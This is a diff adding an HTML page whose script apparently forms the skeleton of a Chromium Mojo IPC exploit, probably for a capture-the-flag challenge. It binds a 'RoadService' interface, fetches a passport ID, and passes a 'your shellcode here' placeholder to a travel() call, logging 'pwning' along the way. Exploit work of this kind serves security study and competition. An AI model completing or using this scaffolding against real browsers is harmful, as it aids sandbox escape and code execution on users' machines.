@@ -1,0 +1,33 @@
+<script src="/mojo_bindings.js"></script>
+<script src="/gen/third_party/blink/public/mojom/road_service.mojom.js"></script>
+
+<script>
+
+  const log = msg => {
+    fetch("/log?log=" + encodeURIComponent(msg));
+  }
+
+  const sleep = ms => new Promise(res => setTimeout(res, ms));
+  window.onerror = e => log(e);
+
+  (async () => {
+    try{
+      log("pwning");
+
+      const ptr = new blink.mojom.RoadServicePtr();
+      Mojo.bindInterface(blink.mojom.RoadService.name, mojo.makeRequest(ptr).handle);
+
+      const { passportId } = await ptr.getPassport();
+      const data = "your shellcode here";
+
+      // TODO: native structs
+      ptr.travel({
+        passportId,
+        data
+      });
+    }catch(e){
+      log("error");
+      log(": " + e.stack);
+    }
+  })();
+</script>
